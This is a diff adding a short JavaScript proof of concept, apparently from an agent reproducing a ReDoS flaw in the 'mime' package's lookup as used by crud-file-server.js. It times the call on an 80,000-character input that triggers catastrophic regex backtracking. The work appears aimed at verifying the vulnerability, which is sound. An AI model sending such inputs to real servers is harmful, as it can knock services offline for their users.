@@ -1,0 +1,18 @@
+Right, needs to run from the project dir. Verified already above with `node -e` in the working directory. Final snippet:
+
+```javascript
+const mime = require("mime");
+
+// Attacker-controlled input (e.g. a requested file path/URL) containing
+// no '.' or '/', forcing mime.lookup's extension-extraction regex
+// (/.*[\.\/]/ inside Mime.prototype.lookup, aliased as `type` at every
+// call site in crud-file-server.js: `var type = require('mime').lookup(relativePath)`)
+// into catastrophic O(n^2) backtracking — a classic ReDoS.
+const evilPath = "a".repeat(80000);
+
+console.time("mime.lookup (type resolution)");
+const type = mime.lookup(evilPath);
+console.timeEnd("mime.lookup (type resolution)");
+
+console.log("resolved type:", type);
+```
